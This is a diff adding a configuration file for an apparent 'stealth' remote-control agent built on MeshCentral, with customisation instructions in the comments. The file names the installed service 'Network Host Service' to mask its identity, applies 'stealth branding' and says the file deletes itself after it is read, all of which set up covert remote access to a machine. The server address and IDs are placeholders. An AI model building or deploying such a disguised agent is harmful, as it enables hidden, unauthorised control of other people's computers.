@@ -1,0 +1,78 @@
+# Modus MSH Configuration
+# This file contains the MeshCentral server connection parameters
+# for the Modus stealth agent.
+#
+# IMPORTANT: This file should be customized for your specific MeshCentral deployment
+# before installation. The stealth service will load this configuration on startup.
+#
+# Security Note: This file contains sensitive information and should be protected
+# from unauthorized access. The stealth service will read this file once during
+# startup and then delete it for security.
+
+# Example MeshCentral Configuration
+# Replace these values with your actual MeshCentral server details
+
+# Mesh Information
+MeshName=Modus Network
+MeshType=2
+MeshID=0x0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF
+
+# Server Information  
+ServerID=0xFEDCBA9876543210FEDCBA9876543210FEDCBA9876543210FEDCBA9876543210
+MeshServer=wss://your-meshcentral-server.com:443/agent.ashx
+
+# Agent Configuration
+agentName=Modus-Agent
+disableUpdate=0
+logUpdate=1
+controlChannelDebug=0
+controlChannelIdleTimeout=300
+
+# Network Configuration  
+WebProxy=
+ignoreProxyFile=0
+
+# Security Configuration
+AgentCapabilities=0x00000001
+coreDumpEnabled=0
+
+# Installation Configuration
+InstallFlags=0
+displayName=Network Host Service
+meshServiceName=Network Host Service
+
+# UI Customization (for stealth branding)
+background=0,0,0
+foreground=255,255,255
+image=default2
+
+# INSTRUCTIONS FOR CUSTOMIZATION:
+# 
+# 1. MeshID: Get this from your MeshCentral server admin panel
+#    - Login to MeshCentral as admin
+#    - Go to "My Devices" > Your mesh group
+#    - Click "Edit Mesh" > "Installation" 
+#    - Copy the MeshID value (long hex string)
+#
+# 2. ServerID: Server certificate hash
+#    - Found in the same location as MeshID
+#    - Copy the ServerID value (long hex string)
+#
+# 3. MeshServer: Your MeshCentral server WebSocket URL
+#    - Format: wss://your-domain.com:443/agent.ashx
+#    - Replace "your-domain.com" with your actual server
+#    - Use "ws://" for non-SSL connections (not recommended)
+#
+# 4. MeshName: Friendly name for your mesh group
+#    - Can be any descriptive name
+#    - Will appear in MeshCentral console
+#
+# 5. agentName: Individual agent identifier
+#    - Optional: defaults to computer hostname
+#    - Useful for identifying specific TaskMaster deployments
+#
+# SECURITY RECOMMENDATIONS:
+# - Use HTTPS/WSS connections when possible
+# - Store this file securely during deployment
+# - Consider encrypting this file for transport
+# - Verify server certificates in production
